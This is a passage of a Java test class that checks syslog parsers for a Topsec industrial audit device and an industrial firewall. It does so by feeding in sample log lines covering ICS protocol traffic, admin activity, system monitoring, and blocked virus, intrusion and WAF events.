  public void testAuditTopsecTopida() {
    String parserFile = "./resources/parsers/audit_topsec_topida_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 10:49:06\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010710490600035378\" i_srcport=\"1239\" i_dstport=\"20000\" s_srcmac=\"00:0c:29:1e:b3:29\" s_dstmac=\"2c:27:d7:23:ef:67\" i_srcip=\"192.168.102.61\" i_dstip=\"192.168.102.60\" time=\"1609987746\" i_ipproto=\"6\" s_protocol=\"DNP3\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" i_dnp3_link_sour=\"2\" i_dnp3_link_dest=\"1\" i_dnp3_app_func=\"1\" i_dnp3_app_iin=\"8192\" s_dnp3_app_object=\"80898,80899,80900\" s_dnp3_app_data=\"\" s_dnp3_briefly=\"源方站端口:2,副方站端口:1,功能:读,内部状态:本地数字输出,请求组别变体:类对象:1类数据,类对象:2类数据,类对象:3类数据,响应组别变体:\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 11:07:19\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010711071901056166\" i_srcport=\"1066\" i_dstport=\"44818\" s_srcmac=\"00:0c:29:62:f1:48\" s_dstmac=\"00:00:bc:24:47:fe\" i_srcip=\"10.65.18.100\" i_dstip=\"10.92.18.17\" time=\"1609988839\" i_ipproto=\"6\" s_protocol=\"EthernetIP\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" i_cip_object=\"6\" i_cip_service=\"84\" i_cip_attr_vendor_id=\"77\" i_cip_attr_dev_type=\"\" i_cip_attr_pro_code=\"\" i_cip_attr_vision=\"\" i_cip_attr_status=\"\" i_cip_attr_number=\"\" i_cip_o_net_conn_id=\"22087940\" i_cip_t_net_conn_id=\"2147485001\" i_cip_conn_ser_num=\"1353\" i_cip_orig_ser_num=\"301621573\" i_cip_attr_enc_ver=\"\" s_cip_brief_introduction=\"使用 Connection Manager 控制命令(命令值：6), 发送 Forward open 服务命令(控制值：84), 由发起者向控制点位目标设备打开一个连接:一 发起者网络连接ID 01510904, 二 目标设备网络连接ID 80000549, 三 控制点位序列号 0549, 四 供应商 Rockwell Software, Inc., 五 控制命令发起者序列号 11fa6145。\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 10:44:41\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010710444101024270\" i_srcport=\"46413\" i_dstport=\"2404\" s_srcmac=\"00:22:15:56:0b:54\" s_dstmac=\"00:16:d1:00:09:05\" i_srcip=\"10.65.102.1\" i_dstip=\"10.20.100.108\" time=\"1609987481\" i_ipproto=\"6\" s_protocol=\"IEC104\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" i_iec104_asdu_causetx_req=\"6\" i_iec104_asdu_typeid_req=\"46\" i_iec104_asdu_addr=\"10\" s_iec104_ioa_req=\"1; \" s_iec104_ioa_value_req=\"分闸; \" s_iec104_asdu_causetx_res=\"7,10,3\" s_iec104_asdu_typeid_res=\"46,46,3\" s_iec104_ioa_res=\"1; 1; 1; \" s_iec104_ioa_value_res=\"分闸; 分闸; 分闸; \" s_decm_briefly_str=\"I(4,39),激活执行:双点命令,asdu地址:10,信息体地址:1,值:分闸,(当前请求响应完成);响应信息说明:激活确认双点命令;激活停止双点命令;突发信息不带时标的双点信息;\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 11:12:20\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010711122001056176\" i_srcport=\"1089\" i_dstport=\"102\" s_srcmac=\"00:11:85:5c:f1:9d\" s_dstmac=\"00:10:18:0a:b1:92\" i_srcip=\"10.65.1.2\" i_dstip=\"10.101.1.3\" time=\"1609989140\" i_ipproto=\"6\" s_protocol=\"IEC61850_MMS\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" i_mms_service_type=\"2\" s_mms_objectName_domainId=\"\" s_mms_objectName_itemId=\"\" s_mms_data_value_data=\"供应商:AREVA T&D Corporation; 型号:e-terracomm; 版本号:2.3.1\" s_mms_FC=\"\" s_decm_briefly_str=\"识别服务,识别到的信息为:供应商:AREVA T&D Corporation; 型号:e-terracomm; 版本号:2.3.1\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 10:39:02\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010710390201021824\" i_srcport=\"4681\" i_dstport=\"502\" s_srcmac=\"a0:8c:fd:d7:fb:a4\" s_dstmac=\"00:0c:29:b3:86:05\" i_srcip=\"192.168.102.63\" i_dstip=\"192.168.102.64\" time=\"1609987142\" i_ipproto=\"6\" s_protocol=\"Modbus\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" i_modbus_trans_id=\"447\" i_modbus_proto_id=\"0\" i_modbus_len=\"8\" i_modbus_unit_id=\"1\" i_modbus_func_code=\"22\" i_modbus_read_starting_addr=\"0\" i_modbus_write_stating_addr=\"0\" s_modbus_coil_val=\"\" s_modbus_reg_val=\"\" s_packet_type=\"匹配响应\" s_modbus_exception_code=\"\" s_decm_briefly_str=\"(0x16)屏蔽写寄存器 参考地址:15 与掩码:0x9eff 或掩码:0x320a  参考地址:15 与掩码:0x9eff 或掩码:0x320a \" s_modbus_input=\"参考地址:15 与掩码:0x9eff 或掩码:0x320a \" s_modbus_output=\"参考地址:15 与掩码:0x9eff 或掩码:0x320a \" i_modbus_error_id=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 11:00:01\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010711000101027954\" i_srcport=\"1127\" i_dstport=\"55831\" s_srcmac=\"00:0c:29:98:81:93\" s_dstmac=\"00:0c:29:98:81:9d\" i_srcip=\"13.10.10.12\" i_dstip=\"13.10.20.7\" time=\"1609988401\" i_ipproto=\"6\" s_protocol=\"OPCDA\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" s_auth=\"无认证\" i_group_id=\"27336\" s_interface_uuid=\"39c13a71011e11d096750020afd8adb3\" i_method_code=\"4\" s_request_param=\"\" s_response_param=\"\" s_decm_briefly_str=\"调用IOPCAsyncIO2(异步IO2操作接口)接口中的Write(写入)方法;输入参数属性有返回参数属性有\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 10:31:32\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010710313200089371\" i_srcport=\"54346\" i_dstport=\"62547\" s_srcmac=\"00:50:56:a8:48:ec\" s_dstmac=\"00:16:31:d0:59:de\" i_srcip=\"14.10.10.28\" i_dstip=\"13.10.10.30\" time=\"1609986692\" i_ipproto=\"6\" s_protocol=\"OPCUA\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" i_secure_channel_id=\"78\" i_token_id=\"1\" s_packet_type=\"匹配响应\" i_request_func=\"527\" s_request_param=\"浏览范围:浏览整个地址空间;所需时间日期:;所需版本：0;每个待浏览节点返回的最大引用数目:无限制;浏览节点NODEID: 0;引用的方向: 只返回前向引用;\" i_response_func=\"530\" s_response_param=\"操作返回状态: GOOD;\" s_decm_briefly_str=\"调用请求方法Browse_request(遍历地址空间)调用响应方法Browse_response(节点列表)\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 10:53:47\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010710534700036630\" i_srcport=\"1566\" i_dstport=\"34964\" s_srcmac=\"00:90:27:4e:e3:fc\" s_dstmac=\"00:09:91:44:20:17\" i_srcip=\"10.10.0.150\" i_dstip=\"10.10.0.129\" time=\"1609988027\" i_ipproto=\"17\" s_protocol=\"Profinet\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" i_pro_operation=\"\" s_pro_block_type=\"IOD读取请求\" s_pro_addr=\"\" s_pro_data=\"IOD读取请求:ARUUID:00000000-0000-0000-0000-000000000000,API:0X00000000,槽:0X0,子槽:0X1,索引:I&M0过滤数据,目标ARUUID:00000000-0000-0000-0000-000000000000\" s_pro_briefly=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"Top\" dev_ip=\"10.56.65.177\" time=\"2021-01-07 11:18:04\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.3722.1_ida\" s_eid=\"21010711180400043174\" i_srcport=\"13429\" i_dstport=\"102\" s_srcmac=\"a0:8c:fd:d7:fb:a4\" s_dstmac=\"00:0c:29:b3:86:05\" i_srcip=\"192.168.102.63\" i_dstip=\"192.168.102.64\" time=\"1609989484\" i_ipproto=\"6\" s_protocol=\"Siemens_S7\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-01631e949d2\" i_s7comm_func=\"240\" i_s7comm_szl_id=\"0\" s_s7comm_address=\"\" s_s7comm_cla_pi_server=\"\" s_s7comm_cla_data=\"\" i_s7comm_cla_error=\"0\" s_s7comm_cla_briefly=\"功能:建立连接\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信下一代工控防火墙
  public void testFirewallTopsecNgtopifw() {
    String parserFile = "./resources/parsers/firewall_topsec_ngtopifw[3.2294.23041e_ifw_46]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=\"NGTOS\" version=\"V3.2294.23040_NGFW.1_R\" time=\"2020-04-14 21:15:51\" dev=\"TopsecOS\" pri=\"6\" type=\"mgmt\" recorder=\"config\" index=\"2000\" vsid=\"0\" user=\"superman\" src=\"192.168.105.86\" result=\"success\" command=\"save \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23037_NGFW.1_R\" time=\"2020-04-13 15:33:24\" dev=\"TopsecOS\" pri=\"6\" type=\"admin\" recorder=\"admin\" index=\"2010\" vsid=\"0\" user=\"superman\" src=\"127.0.0.1\" op=\"local login\" method=\"Serial\" result=\"success\" description=\"login success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23037_NGFW.1_R\" time=\"2020-04-13 15:31:21\" dev=\"TopsecOS\" pri=\"6\" type=\"admin\" recorder=\"admin\" index=\"2011\" vsid=\"0\" user=\"superman\" src=\"127.0.0.1\" method=\"Serial\" result=\"success\" description=\"modify self passwd success.";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23037_NGFW.1_R\" time=\"2020-04-09 19:11:35\" dev=\"TopsecOS\" pri=\"6\" type=\"操作管理员日志\" recorder=\"admin_config\" index=\"2012\" vsid=\"0\" user=\"superman\" description=\"添加管理员：aabbcc 成功.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23037_NGFW.1_R\" time=\"2020-04-13 22:28:42\" dev=\"TopsecOS\" pri=\"5\" type=\"链路备份\" recorder=\"linkbak\" index=\"2485\" vsid=\"0\" linkbak_id=\"0\" master_id=\"1\" slave_id=\"2\" using_id=\"2\" dst=\"3.3.3.2/32\" msg=\"链路切换到备\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-13 09:26:05\" dev=\"TopsecOS\" pri=\"1\" type=\"接口日志\" recorder=\"interface\" index=\"2280\" vsid=\"0\" interface=\"feth2\" op=\"up\" speed=\"100 Mbps\" duplex=\"Full Duplex\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23039_NGFW.1_R_B\" time=\"2020-04-08 20:57:31\" dev=\"TopsecOS\" pri=\"5\" type=\"firmware_update\" recorder=\"firmware\" index=\"2090\" vsid=\"0\" op=\"delete\" result=\"0\" msg=\"firmware delete V3.2242.22099_NGFW.1_R_upt success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 15:24:17\" dev=\"TopsecOS\" pri=\"1\" type=\"cpu_monitor\" recorder=\"cpu_monitor\" index=\"2400\" vsid=\"0\" msg=\"The occupancy rate of CPU has reached 11%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 15:24:17\" dev=\"TopsecOS\" pri=\"1\" type=\"memory_monitor\" recorder=\"memory_monitor\" index=\"2401\" vsid=\"0\" msg=\"The occupancy rate of MEMORY has reached 44%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 15:31:18\" dev=\"TopsecOS\" pri=\"1\" type=\"disk_monitor\" recorder=\"disk_monitor\" index=\"2402\" vsid=\"0\" msg=\"The occupancy rate of DISK has reached 1%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 15:31:47\" dev=\"TopsecOS\" pri=\"1\" type=\"cputemp_monitor\" recorder=\"cputemp_monitor\" index=\"2406\" vsid=\"0\" msg=\"The temperature of CPU has reached 42℃!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 15:31:34\" dev=\"TopsecOS\" pri=\"1\" type=\"systemp_monitor\" recorder=\"systemp_monitor\" index=\"2407\" vsid=\"0\" msg=\"The temperature of SYSTEM has reached 42℃\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 15:31:34\" dev=\"TopsecOS\" pri=\"1\" type=\"dualpower_monitor\" recorder=\"dualpower_monitor\" index=\"2408\" vsid=\"0\" msg=\"the device only inserts a power supply\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 15:31:34\" dev=\"TopsecOS\" pri=\"1\" type=\"recover\" recorder=\"recover\" index=\"2405\" vsid=\"0\" msg=\"[2020-04-12 15:31:34] the process of 'inp' is started by  tos_recoverd.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-4-15 11:29:50\" dev=\"TopsecOS\" pri=\"5\" type=\"license_update\" recorder=\"license\" index=\"2095\" vsid=\"0\" op=\"update\"  msg=\"license update success.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-20 15:10:32\" dev=\"TopsecOS\" pri=\"5\" type=\"rules_update\" recorder=\"rules_update\" index=\"2105\" vsid=\"0\" op=\"import\" msg=\"rules-update import success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23038_NGFW.1_R\" time=\"2020-04-08 08:38:42\" dev=\"TopsecOS\" pri=\"4\" type=\"本机服务\" recorder=\"pf\" index=\"2460\" vsid=\"0\" src=\"192.168.105.202\" dst=\"192.168.105.201\" sport=\"60430\" dport=\"22\" proto=\"tcp\" smac=\"50:65:f3:22:79:97\" dmac=\"00:16:31:ec:18:82\" sdev=\"feth0\" appname=\"ssh\" action=\"拒绝\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-12 14:26:12\" dev=\"TopsecOS\" pri=\"6\" type=\"vpn\" recorder=\"ipsec\" index=\"2300\" vsid=\"0\" vsys_name=\"root_vsys\" tunnel_name=\"test\" ike_moudle=\"quick mode\" sa_savelive=\"28800\" num_of_consultations=\"3\" msg=\"The second stage was successful\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_test_R_upt\" time=\"2020-04-17 11:13:00\" dev=\"TopsecOS\" pri=\"6\" type=\"user_auth\" recorder=\"user_auth\" index=\"2062\" vsid=\"0\" user=\"usr1\" src=\"192.168.105.38\" op=\"login\" result=\"0\" description=\"login success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23037_NGFW.1_R\" time=\"2020-04-13 15:36:41\" dev=\"TopsecOS\" pri=\"6\" type=\"ha\" recorder=\"ha\" index=\"2240\" vsid=\"0\" msg=\"ha start OK\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-15 17:28:06\" dev=\"TopsecOS_180\" pri=\"6\" type=\"ac\" recorder=\"ac\" index=\"1050\" vsid=\"0\" vsys_name=\"root_vsys\" policyid=\"15435\" policyname=\"fw412144024\" protoname=\"UDP\" src=\"192.168.105.176\" sport=\"5246\" dst=\"10.105.136.180\" dport=\"12222\" action=\"accept\" appname=\"unknown\" user=\"unknown\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23038_NGFW.1_R\" time=\"2020-04-08 08:53:07\" dev=\"TopsecOS\" pri=\"6\" type=\"ids\" recorder=\"ids\" index=\"1235\" vsid=\"0\" vsys_name=\"root_vsys\" idsip=\"55.55.55.254\" src=\"192.168.199.10\" dst=\"192.168.199.103\" msg=\"IDS equipment information was reported successfully\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R_B\" time=\"2020-04-16 16:48:16\" dev=\"TopsecOS\" pri=\"4\" type=\"streamav\" recorder=\"streamav\" index=\"1021\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"http\" user=\"10.131.241.11\" src=\"10.131.241.11\" dst=\"192.168.131.241\" sport=\"888\" dport=\"50970\" fw_name=\"fw412131922\" url=\"10.31.241.11:888/2_2fulltest/localfile!!AABBCC_000007f8.zip\" sender=\"null\" receiver=\"null\" cc=\"null\" subject=\"null\" comand=\"DOWNLOAD\" filename=\"null\" virus_name=\"[ 病 毒 名 ]Trojan/Agent.gnar\" action=\"block\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_test_R_upt\" time=\"2020-04-17 11:08:57\" dev=\"TopsecOS\" pri=\"4\" type=\"url_filter\" recorder=\"url_filter\" index=\"1110\" vsid=\"0\" vsys_name=\"root_vsys\" user=\"192.168.2.254\" src=\"192.168.2.254\" dst=\"192.168.3.254\" sport=\"1171\" dport=\"8081\" fw_name=\"asdasdasdasdasd\" profile=\"dasdasdas\" subtype=\"blacklist\" cat_name=\"none\" url=\"192.168.3.254:8081\" action=\"block\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23040_NGFW.1_R\" time=\"2020-04-12 14:50:03\" dev=\"TopsecOS\" pri=\"4\" type=\"data_filter\" recorder=\"datafilter\" index=\"1130\" vsid=\"0\" vsys_name=\"root_vsys\" user=\"20.20.20.22\" src=\"20.20.20.22\" dst=\"192.168.105.191\" sport=\"80\" port=\"49258\" profile=\"data-filter\" groupname=\"aa\" protoname=\"http\" fw_name=\"fw408144833\" field=\"down\" action=\"block\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23040_NGFW.1_R\" time=\"2020-04-12 14:50:03\" dev=\"TopsecOS\" pri=\"4\" type=\"数据过滤\" recorder=\"datafilter\" index=\"1130\" vsid=\"0\" vsys_name=\"root_vsys\" user=\"20.20.20.22\" src=\"20.20.20.22\" dst=\"192.168.105.191\" sport=\"80\" dport=\"49321\" profile=\"data-filter\" groupname=\"aa\" protoname=\"http\" fw_name=\"fw408144833\" field=\"下载\" action=\"阻断\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23040_NGFW.1_R\" time=\"2020-04-12 14:59:40\" dev=\"TopsecOS\" pri=\"4\" type=\"file_block\" recorder=\"file_block\" index=\"1100\" vsid=\"0\" vsys_name=\"root_vsys\" user=\"20.20.20.22\" protoname=\"HTTP\" src=\"20.20.20.22\" dst=\"192.168.105.191\" port=\"80\" dport=\"49367\" fw_name=\"fw408144833\" direction=\"download\" filetype=\"gif\" action=\"block\" profile=\"file-block\" rule=\"rule-http\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-18 14:54:09\" dev=\"TopsecOS\" pri=\"6\" type=\"pf_rule\" recorder=\"pf_rule\" index=\"1145\" vsid=\"0\" vsys_name=\"root_vsys\" src=\"2.2.2.2\" dst=\"2.22.2.3\" sport=\"0\" dport=\"0\" smac=\"unknown\" dmac=\"unknown\" protoid=\"0\" user=\"unknown\" appname=\"unknown\" modname=\"URL_FILTER\" msg=\"add a dynamic blacklist\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23040_NGFW.1_R\" time=\"2020-04-12 14:59:40\" dev=\"TopsecOS\" pri=\"4\" type=\"apt\" recorder=\"apt\" index=\"1080\" vsid=\"0\" sys_name=\"root_vsys\" protoname=\"smtp\" user=\"null\" src=\"192.168.55.100\" dst=\"192.168.66.100\" sport=\"2066\" dport=\"6400\" method=\"null\" url=\"null\" sender=\"456@test.com\" receiver=\"123@test.com\" cc=\"123@test.com\" bcc=\"null\" subject=\"7328\" filename=\"7328\" virus_name=\"Worm[NET]/Win32.Nimda.gic\"  fw_name=\"fw104155713\" action=\"block\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23039_NGFW.1_R\" time=\"2012-01-30 13:55:55\" dev=\"TopsecOS\" pri=\"6\" type=\"ipmac\" recorder=\"ipmac\" index=\"1140\" vsid=\"0\" vsys_name=\"root_vsys\" src=\"192.168.105.38\" smac=\"50:65:f3:50:03:15\" msg=\"IP address=192.168.105.38  MAC address=50:65:f3:50:03:16  IP matches wrong with MAC\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23040_NGFW.1_R_B\" time=\"2020-04-08 20:48:02\" dev=\"TopsecOS\" pri=\"4\" type=\"ads_clean\" recorder=\"ads_clean\" index=\"2160\" vsid=\"0\" sub_type=\"attack log\" dst_addr=\"192.168.105.27\" zonename=\"192.168.105.27\" grpname=\"192.168.105.27\" attack_status=\"continue\" src_addr=\"192.168.105.30\" service=\" \" protocol_4=\"ICMP\" dst_port=\"8\" attack_type=\"icmp flood\" defense_method=\"icmp source limit\" cur_cfg_value=\"1\" cfg_value_unit=\"pps\" total_packets=\"4352\" attack_packets=\"3968\" total_bytes=\"426496\" attack_bytes=\"388864\" data_action=\"drop\" attack_msgs=\" \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-13 10:32:31\" dev=\"TopsecOS\" pri=\"3\" type=\"abnormal_threat\" recorder=\"abnormal_threat\" index=\"1225\" vsid=\"0\" vsys_name=\"root_vsys\" policyid=\"123456\" abnormal_warning_type=\"allsession\" msg=\" standard is 11,current is 50,Not within the range of fluctuation(11)\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23040_NGFW.1_R\" time=\"2020-04-13 11:01:02\" dev=\"TopsecOS\" pri=\"6\" type=\"入侵防御日志\" recorder=\"IPSEVENT\" index=\"2120\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"tcp\" src=\"1.1.0.39\" sport=\"42015\" dst=\"1.1.0.156\" dport=\"80\" smac=\"02:1a:c5:01:00:27\" dmac=\"02:1a:c5:02:00:1c\" rid=\"19154\" msg=\"Apache APR_PSPrintf内存数据损坏溢出攻击(webdva) \" action=\"告警\" cve=\"NULL\" attack_type=\"溢出攻击类（Buffer-Overflow）\" os_name=\"所有\" pop_name=\"低\" risk_name=\"低\" sift_name=\"一般规则\" application=\"unknown\" fw_name=\"fw41311858\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23040_NGFW.1_R\" time=\"2020-04-13 11:27:40\" dev=\"TopsecOS\" pri=\"4\" type=\"waf\" recorder=\"TOPWAFEVENT\" index=\"2150\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"HTTP\" src=\"172.16.1.10\" sport=\"4086\" dst=\"172.16.1.20\" dport=\"80\" smac=\"00:0c:29:b3:49:4e\" dmac=\"00:50:56:ba:2d:31\" rid=\"1020002\" rule_msg=\"扫描器防护(user-agents)\" action=\"block\" cve=\"NULL\" attack_type=\"扫描器防护\" severity=\"中\" accurate=\"高\" fw_name=\"fw413112740\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-16 16:08:33\" dev=\"bhb_24.40\" pri=\"4\" type=\"spam\" recorder=\"spam\" index=\"2350\" vsid=\"0\" vsys_name=\"root_vsys\" fw_name=\"fw416154521\" src=\"4.4.4.5\" dst=\"3.3.3.6\" sender=\"baohb@test.com.cn\" receiver=\"3.3.3.6@test.com.cn;\" cc=\"null\" subject=\"123\" filename=\"null\" action=\"block\" msg=\"Hit Sender blacklist\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-13 20:30:45\" dev=\"TopsecOS\" pri=\"6\" type=\"nat\" recorder=\"nat\" index=\"2555\" vsid=\"0\" policyid=\"12142\" proto=\"icmp\" src=\"10.11.1.8\" trans_sip=\"10.11.1.1\" port_block=\"12139\" port_start=\"10001\" port_end=\"11000\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23035_NGFW_develop_3.1_R\" time=\"2020-04-16 04:51:22\" dev=\"TopsecOS\" pri=\"6\" type=\"nat\" recorder=\"nat_msg\" index=\"2556\" vsid=\"0\" proto=\"icmp\" src=\"10.22.1.77\" trans_sip=\"10.22.1.77\" port_start=\"20000\" port_end=\"20999\" msg=\"The port_block of 8057 has been free.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23038_NGFW.1_R\" time=\"2020-04-08 09:00:20\" dev=\"TopsecOS\" pri=\"6\" type=\"sslvpn_system\" recorder=\"sslvpn system\" index=\"2370\" vsid=\"0\" user=\"user\" ip=\"192.168.105.202\" dst=\"169.254.1.1\" uri=\"/vone/login/user_pswd\" msg=\"User login success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23038_NGFW.1_R\" time=\"2020-04-08 09:00:22\" dev=\"TopsecOS\" pri=\"6\" type=\"sslvpn_na\" recorder=\"sslvpn na\" index=\"2371\" vsid=\"0\" user=\"user\" src=\"192.168.105.202\" dst=\"192.168.105.201\" sport=\"50284\" dport=\"4433\" op=\"new tunnel\" send_bytes=\"0B\" rcv_bytes=\"344B\" virtual_ip=\"0.0.0.0\" subnet=\"0.0.0.0\" work_mode=\"transparent\" acl_num=\"0\" msg=\"login failed\" url=\"-\" dstip=\"-\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041E_IFW_46.1_R\" time=\"2021-01-20 15:14:07\" dev=\"TopsecOS\" pri=\"4\" type=\"工控协议过滤\" recorder=\"industrial_protect\" index=\"2500\" vsid=\"0\" vsys_name=\"root_vsys\" src=\"192.168.123.24\" dst=\"192.168.217.205\" sport=\"54503\" dport=\"102\" protoname=\"s7\" profile=\"s7\" fw_name=\"fw12015644\" code=\"496::Job(0x01)-Setup communicat ion(0xF0)\" address=\"null\" datatype=\"null\" value=\"null\" action=\"阻断\" msg=\"null\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041E_IFW_46.1_R\" time=\"2021-01-21 14:25:47\" dev=\"TopsecOS\" pri=\"5\" type=\"工业测试\" recorder=\"industrial_test\" index=\"2511\" vsid=\"0\" vsys_name=\"root_vsys\" src=\"192.168.123.24\" dst=\"192.168.217.205\" sport=\"54798\" dport=\"102\" protoname=\"s7\" profile=\"s7\" fw_name=\"fw121142655\" code=\"459777::User_data(0x07)-CPU functions(0x04)-Read SZL(0x01)\" address=\"null\" datatype=\"null\" value=\"null\" action=\"告警\" msg=\"null\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //深信服终端检测响应平台
